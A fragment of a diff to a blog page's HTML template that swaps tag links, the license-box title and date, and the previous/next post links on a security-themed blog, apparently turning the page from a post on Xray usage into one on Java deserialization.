+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">#反序列化</a>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/">#漏洞扫描</a>
+        <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>
       
     </div>
   
@@ -503,8 +508,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Xray的基本使用</div>
-      <div>https://jsweetcoffee.github.io/posts/8487c21c.html</div>
+      <div>java反序列化全家桶</div>
+      <div>https://jsweetcoffee.github.io/posts/a840fd.html</div>
     </div>
     <div class="license-meta">
       
@@ -516,7 +521,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月17日</div>
+          <div>2023年9月15日</div>
         </div>
       
       
@@ -548,18 +553,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/posts/f656209c.html" title="红日内网靶场vulnstack-7">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">红日内网靶场vulnstack-7</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/posts/4b05df7d.html" title="nmap与sqlmap常用参数">
-                        <span class="hidden-mobile">nmap与sqlmap常用参数</span>
+                      <a href="/posts/a129f2e3.html" title="访问域名全流程">
+                        <span class="hidden-mobile">访问域名全流程</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
